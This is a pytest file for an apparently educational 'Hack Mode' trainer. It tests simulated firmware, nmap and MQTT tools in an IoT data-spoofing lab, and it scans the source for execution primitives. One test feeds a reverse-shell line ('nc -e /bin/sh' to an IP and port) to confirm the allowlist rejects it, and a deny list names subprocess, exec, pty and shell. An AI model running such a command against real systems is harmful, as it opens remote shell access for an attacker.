"""Phase 2C verification: the generic, real-tool Hack Mode toolbox.

Covers what Phase 2C adds on top of the Phase 2A/2B/normalization baseline
(exercised elsewhere and not repeated here): `CommandSpec.category` and the
registry's grouped listing, the real-tool firmware trio (`esptool.py`,
`strings`, `grep` — replacing the earlier placeholder `firmware-extract` /
`firmware-analyze` commands, with `mqtt-explorer` removed outright since it
was never a real tool), the `history` trainer utility, and — the
centrepiece — a direct proof that no generic handler requires knowing which
scenario is active.
"""

from __future__ import annotations

import asyncio
import pathlib
import tokenize
from typing import Any

import pytest

from app.commands import (
    CommandCategory,
    CommandContext,
    CommandResult,
    CommandRouter,
    build_default_registry,
)
from app.commands.registry import CATEGORY_DISPLAY_ORDER
from app.scenarios import EnvironmentalMonitoringScenario, ScenarioOutcome
from app.scenarios.base import Scenario
from app.scenarios.events import ScenarioEvent
from app.scenarios.state import ScenarioState, TargetInfo
from app.sessions import HackSession

_T = EnvironmentalMonitoringScenario().state.target
TARGET_IP = _T.ip_address
TARGET_PORT = _T.mqtt_port
TARGET_TOPIC = _T.mqtt_topic

APP_DIR = pathlib.Path(__file__).resolve().parent.parent / "app"


@pytest.fixture
def router() -> CommandRouter:
    return CommandRouter(build_default_registry())


@pytest.fixture
def context() -> CommandContext:
    return CommandContext(session=HackSession(session_id="toolbox-test"))


def run(router: CommandRouter, line: str, context: CommandContext) -> CommandResult:
    return asyncio.run(router.dispatch(line, context))


def joined(result: CommandResult) -> str:
    return "\n".join(result.lines)


# --- registry: category metadata -------------------------------------------


def test_every_registered_command_has_a_category(router: CommandRouter) -> None:
    for spec in router.registry.specs():
        assert isinstance(spec.category, CommandCategory)


def test_category_display_order_covers_every_category() -> None:
    """Nothing in `help`'s grouping can silently drop a category."""
    assert set(CATEGORY_DISPLAY_ORDER) == set(CommandCategory)


def test_registry_groups_by_category_correctly(router: CommandRouter) -> None:
    grouped = router.registry.by_category()
    assert {spec.name for spec in grouped[CommandCategory.FIRMWARE]} == {
        "esptool.py",
        "strings",
        "grep",
    }
    assert grouped[CommandCategory.NETWORK] == (router.registry.get("nmap"),)
    assert {spec.name for spec in grouped[CommandCategory.MQTT]} == {
        "mosquitto_pub",
        "mosquitto_sub",
    }
    assert {spec.name for spec in grouped[CommandCategory.SERIAL]} == {
        "serial-close",
        "serial-monitor",
        "serial-send",
        "serial-status",
    }
    assert {spec.name for spec in grouped[CommandCategory.TRAINER]} == {
        "clear",
        "help",
        "history",
    }


def test_help_renders_every_category_heading(
    router: CommandRouter, context: CommandContext
) -> None:
    text = joined(run(router, "help", context))
    for heading in (
        "Firmware / analysis:",
        "Network reconnaissance:",
        "MQTT:",
        "Serial / hardware:",
        "Trainer utilities:",
    ):
        assert heading in text
    assert "history" in text


def test_unknown_command_is_still_rejected_cleanly(
    router: CommandRouter, context: CommandContext
) -> None:
    """The registry stays a closed allowlist — new categories change nothing."""
    result = run(router, "nc -e /bin/sh 10.0.0.1 4444", context)
    assert result.exit_code == 127
    assert "not found" in joined(result)


def test_invalid_arguments_are_still_rejected(
    router: CommandRouter, context: CommandContext
) -> None:
    assert run(router, "nmap", context).exit_code == 2  # EXIT_USAGE
    assert run(router, "mosquitto_pub -h 1.2.3.4", context).exit_code == 2


# --- esptool.py / strings / grep: the real-tool firmware trio ---------------


def test_esptool_read_flash_extracts_firmware(
    router: CommandRouter, context: CommandContext
) -> None:
    result = run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    assert result.exit_code == 0
    assert context.scenario.state.discovery.firmware_extracted is True


def test_esptool_rejects_an_unsupported_subcommand(
    router: CommandRouter, context: CommandContext
) -> None:
    result = run(router, "esptool.py chip_id", context)
    assert result.exit_code == 2
    assert context.scenario.state.discovery.firmware_extracted is False


def test_esptool_requires_a_subcommand(
    router: CommandRouter, context: CommandContext
) -> None:
    result = run(router, "esptool.py", context)
    assert result.exit_code == 2


def test_strings_dumps_every_firmware_string(
    router: CommandRouter, context: CommandContext
) -> None:
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    text = joined(run(router, "strings firmware.bin", context))
    assert TARGET_IP in text
    assert str(TARGET_PORT) in text
    assert TARGET_TOPIC in text


def test_strings_requires_a_filename(
    router: CommandRouter, context: CommandContext
) -> None:
    result = run(router, "strings", context)
    assert result.exit_code == 2


def test_grep_finds_matching_strings(
    router: CommandRouter, context: CommandContext
) -> None:
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    text = joined(run(router, "grep MQTT firmware.bin", context))
    assert TARGET_TOPIC in text  # the matched "MQTT topic: ..." line


def test_grep_with_no_match_is_silent_and_fails(
    router: CommandRouter, context: CommandContext
) -> None:
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    result = run(router, "grep zzz_no_such_string firmware.bin", context)
    assert result.exit_code != 0
    assert result.lines == ()


def test_grep_requires_a_pattern_and_a_file(
    router: CommandRouter, context: CommandContext
) -> None:
    assert run(router, "grep", context).exit_code == 2
    assert run(router, "grep MQTT", context).exit_code == 2


def test_grep_still_gated_on_extraction(
    router: CommandRouter, context: CommandContext
) -> None:
    """A search must not bypass the existing extraction gate."""
    result = run(router, "grep MQTT firmware.bin", context)
    assert result.exit_code != 0
    assert "esptool.py" in joined(result)
    assert context.scenario.state.discovery.firmware_analyzed is False


def test_grep_does_not_add_extra_events(
    router: CommandRouter, context: CommandContext
) -> None:
    """A search is a read, not a new discovery path — same three events either way."""
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    with_search = run(router, "grep MQTT firmware.bin", context)
    assert [e.type.value for e in with_search.events] == [
        "firmware_analyzed",
        "broker_discovered",
        "topic_discovered",
    ]


# --- history -----------------------------------------------------------


def test_history_starts_empty(router: CommandRouter, context: CommandContext) -> None:
    result = run(router, "history", context)
    assert result.exit_code == 0
    assert "No commands recorded yet." in joined(result)


def test_history_lists_prior_commands_but_not_itself(
    router: CommandRouter, context: CommandContext
) -> None:
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    run(router, "help", context)
    lines = joined(run(router, "history", context)).split("\n")
    body, header = lines[1:], lines[0]
    text = "\n".join(body)
    assert "esptool.py" in text
    assert "help" in text
    assert "Command history" in header
    # The current `history` invocation is recorded by the router only after
    # this handler returns (see CommandRouter.dispatch) — it cannot see
    # itself. Checked against the row body, not the heading line, which
    # legitimately says "history" as the feature's own name.
    assert "history" not in text


def test_history_shows_exit_codes(router: CommandRouter, context: CommandContext) -> None:
    run(router, "nmap", context)  # usage error, exit 2
    text = joined(run(router, "history", context))
    assert "(exit 2)" in text


def test_history_is_generic_and_needs_no_scenario_import() -> None:
    """Static proof `history.py` never imports the scenario package.

    Parses real `import`/`from ... import` statements rather than
    substring-searching the file, since the module's own docstring
    legitimately *mentions* `app.scenarios` in prose (to say it is NOT
    imported) — a plain substring check would flag its own explanation.
    """
    import ast

    from app.commands.handlers import history as history_module

    source = pathlib.Path(history_module.__file__).read_text(encoding="utf-8")
    tree = ast.parse(source)
    imported_modules: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported_modules.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported_modules.add(node.module)

    assert not any(m.startswith("app.scenarios") for m in imported_modules)


def test_history_is_session_isolated(router: CommandRouter) -> None:
    a = CommandContext(session=HackSession(session_id="hist-a"))
    b = CommandContext(session=HackSession(session_id="hist-b"))
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", a)

    a_text = joined(run(router, "history", a))
    b_text = joined(run(router, "history", b))
    assert "esptool.py" in a_text
    assert "No commands recorded yet." in b_text


# --- security boundary: repo-wide, including every Phase 2C file -----------


_FORBIDDEN_NAMES = frozenset(
    {
        "subprocess",
        "pty",
        "system",
        "popen",
        "spawn",
        "execl",
        "execv",
        "execve",
        "spawnl",
        "spawnv",
        "eval",
        "exec",
        "compile",
        "shell",
    }
)

_EXEMPT = frozenset({APP_DIR / "build" / "process.py"})

_NEW_PHASE_2C_FILES = (
    APP_DIR / "commands" / "handlers" / "history.py",
)


def _code_names(path: pathlib.Path) -> set[str]:
    names: set[str] = set()
    with tokenize.open(path) as handle:
        for token in tokenize.generate_tokens(handle.readline):
            if token.type == tokenize.NAME:
                names.add(token.string)
    return names


def test_new_phase_2c_files_exist_and_are_covered_by_the_execution_scan() -> None:
    """Belt-and-braces: confirm the new file is really there and really scanned.

    `tests/test_hack_backend.py::test_backend_source_contains_no_execution_primitives`
    already walks the whole `app/` tree, so it covers this file automatically —
    this test only makes that coverage explicit and would fail loudly if the
    file were ever moved outside `app/` or renamed away from `.py`.
    """
    for path in _NEW_PHASE_2C_FILES:
        assert path.exists()
        assert path not in _EXEMPT
        assert _code_names(path) & _FORBIDDEN_NAMES == set()


def test_no_new_execution_primitive_anywhere_under_commands_or_scenarios() -> None:
    """Re-run of the standing guard, scoped to the packages Phase 2C touched."""
    offenders = []
    for pkg in (APP_DIR / "commands", APP_DIR / "scenarios"):
        for path in sorted(pkg.rglob("*.py")):
            for name in sorted(_code_names(path) & _FORBIDDEN_NAMES):
                offenders.append(f"{path.relative_to(APP_DIR)}: {name}")
    assert offenders == []


# --- generic architecture: the same engine, a different scenario -----------


class _AlternateScenario(Scenario):
    """A second, deliberately different target — the genericity proof.

    Test-only. It exists to demonstrate, directly, that `nmap`,
    `mosquitto_sub`, `mosquitto_pub`, and `grep` — the exact, unmodified
    production handler modules — produce correct results against
    ANY `Scenario` implementation. There is no `if panel_id == 1` /
    `elif panel_id == 2` in the dispatch path for this test to route around:
    swapping `HackSession.scenario` for an instance of this class is the
    whole story.

    Reuses `ScenarioState`/`TargetInfo` from `app.scenarios.state` rather
    than inventing a parallel shape, which is itself evidence those
    dataclasses are already scenario-agnostic infrastructure.
    """

    scenario_id = "alternate-target"

    def __init__(self) -> None:
        self._state = ScenarioState(
            target=TargetInfo(
                ip_address="10.50.0.7",
                mqtt_port=8883,
                mqtt_topic="lab/altitude/reading",
                device_status="online",
            )
        )
        self._events: list[ScenarioEvent] = []

    @property
    def state(self) -> ScenarioState:
        return self._state

    @property
    def events(self) -> tuple[ScenarioEvent, ...]:
        return tuple(self._events)

    def extract_firmware(self) -> ScenarioOutcome:
        self._state.discovery.firmware_extracted = True
        return ScenarioOutcome.ok("alt: firmware extracted")

    def analyze_firmware(self, search: str | None = None) -> ScenarioOutcome:
        if not self._state.discovery.firmware_extracted:
            return ScenarioOutcome.failed("alt: no firmware image")
        target = self._state.target
        self._state.discovery.firmware_analyzed = True
        self._state.discovery.broker_discovered = True
        self._state.discovery.topic_discovered = True
        lines = [f"alt: broker {target.ip_address}:{target.mqtt_port}, topic {target.mqtt_topic}"]
        if search and "altitude" in search.lower():
            lines.append("alt: match ALT_SENSOR_DEBUG_STRING")
        return ScenarioOutcome.ok(*lines)

    def scan(self, host: str | None, port: int | None) -> ScenarioOutcome:
        target = self._state.target
        if host != target.ip_address:
            return ScenarioOutcome.failed("alt: host down")
        return ScenarioOutcome.ok(f"alt: {target.mqtt_port}/tcp open")

    def observe(
        self, host: str | None, port: int | None, topic: str | None
    ) -> ScenarioOutcome:
        target = self._state.target
        if host != target.ip_address or topic != target.mqtt_topic:
            return ScenarioOutcome.failed("alt: connection refused")
        self._state.discovery.mqtt_observed = True
        return ScenarioOutcome.ok(f"alt: telemetry on {topic}")

    def publish(
        self,
        host: str | None,
        port: int | None,
        topic: str | None,
        message: str | None,
    ) -> ScenarioOutcome:
        target = self._state.target
        if host != target.ip_address or topic != target.mqtt_topic:
            return ScenarioOutcome.failed("alt: publish rejected")
        self._state.attack.spoof_successful = True
        self._state.completion.attack_successful = True
        return ScenarioOutcome.ok("alt: manipulated data accepted")

    def snapshot(self) -> dict[str, Any]:
        return {"scenario_id": self.scenario_id}


@pytest.fixture
def alt_context() -> CommandContext:
    session = HackSession(session_id="alt-scenario-test")
    session.scenario = _AlternateScenario()  # the only thing that changes
    return CommandContext(session=session)


def test_nmap_handler_needs_no_change_for_a_different_target(
    router: CommandRouter, alt_context: CommandContext
) -> None:
    # The SAME nmap.py handler, unmodified, against a target whose IP has
    # never appeared in Environmental Monitoring's own configuration.
    result = run(router, "nmap 10.50.0.7", alt_context)
    assert result.exit_code == 0
    assert "8883/tcp open" in joined(result)
    # And it must reject the Environmental Monitoring scenario's own IP,
    # proving nothing about that scenario leaked into this run.
    result = run(router, f"nmap {TARGET_IP}", alt_context)
    assert result.exit_code != 0


def test_mqtt_handlers_need_no_change_for_a_different_topic(
    router: CommandRouter, alt_context: CommandContext
) -> None:
    result = run(router, "mosquitto_sub -h 10.50.0.7 -p 8883 -t lab/altitude/reading", alt_context)
    assert result.exit_code == 0
    assert "lab/altitude/reading" in joined(result)

    result = run(
        router,
        "mosquitto_pub -h 10.50.0.7 -p 8883 -t lab/altitude/reading -m ignored",
        alt_context,
    )
    assert result.exit_code == 0
    assert alt_context.scenario.state.completion.attack_successful is True
    # The Environmental Monitoring scenario's own topic must not work here.
    wrong_topic = run(
        router, f"mosquitto_pub -h 10.50.0.7 -p 8883 -t {TARGET_TOPIC} -m x", alt_context
    )
    assert wrong_topic.exit_code != 0


def test_grep_needs_no_change_for_a_different_scenario(
    router: CommandRouter, alt_context: CommandContext
) -> None:
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", alt_context)
    result = run(router, "grep altitude firmware.bin", alt_context)
    assert "ALT_SENSOR_DEBUG_STRING" in joined(result)


def test_two_sessions_on_two_different_scenarios_stay_isolated(
    router: CommandRouter, context: CommandContext, alt_context: CommandContext
) -> None:
    """Different students, different scenarios, one unmodified engine."""
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    run(router, "strings firmware.bin", context)
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", alt_context)
    run(router, "strings firmware.bin", alt_context)

    assert context.scenario.state.target.ip_address == TARGET_IP
    assert alt_context.scenario.state.target.ip_address == "10.50.0.7"
    assert context.scenario.state.target.ip_address != alt_context.scenario.state.target.ip_address


# --- event integration: Phase 2C actions still flow through Phase 2B -------


def test_history_command_itself_is_recorded_by_the_event_layer(
    router: CommandRouter, context: CommandContext
) -> None:
    run(router, "history", context)
    recorded = context.session.recorder.commands
    assert recorded[-1].name == "history"
    assert recorded[-1].handled is True


def test_grep_pattern_is_captured_in_the_command_record(
    router: CommandRouter, context: CommandContext
) -> None:
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    run(router, "grep MQTT firmware.bin", context)
    recorded = context.session.recorder.commands
    assert recorded[-1].name == "grep"
    assert recorded[-1].argv == ("grep", "MQTT", "firmware.bin")


def test_no_new_scenario_event_type_was_introduced_for_search_or_history() -> None:
    """Phase 2C recorded a new command, not a new domain-event type."""
    from app.scenarios.events import ScenarioEventType

    values = {member.value for member in ScenarioEventType}
    assert "firmware_searched" not in values
    assert "history_viewed" not in values
    assert len(values) == 11  # unchanged from Phase 2B/normalization


# --- existing Hack flow, with the new toolbox exercised along the way -----


def test_existing_flow_still_reaches_attack_completed_with_search_and_history_used(
    router: CommandRouter, context: CommandContext
) -> None:
    run(router, "esptool.py read_flash 0x0 0x400000 firmware.bin", context)
    run(router, "grep MQTT firmware.bin", context)  # Phase 2C search, used mid-flow
    run(router, "history", context)  # Phase 2C utility, used mid-flow
    run(router, f"nmap -p {TARGET_PORT} {TARGET_IP}", context)
    run(router, f"mosquitto_sub -h {TARGET_IP} -t {TARGET_TOPIC}", context)
    result = run(
        router, f'mosquitto_pub -h {TARGET_IP} -t {TARGET_TOPIC} -m \'{{"temperature": 41}}\'', context
    )
    assert context.scenario.state.completion.attack_successful is True
    event_types = [e.type.value for e in context.scenario.events]
    assert event_types[-1] == "attack_completed"
    assert "scan" in event_types
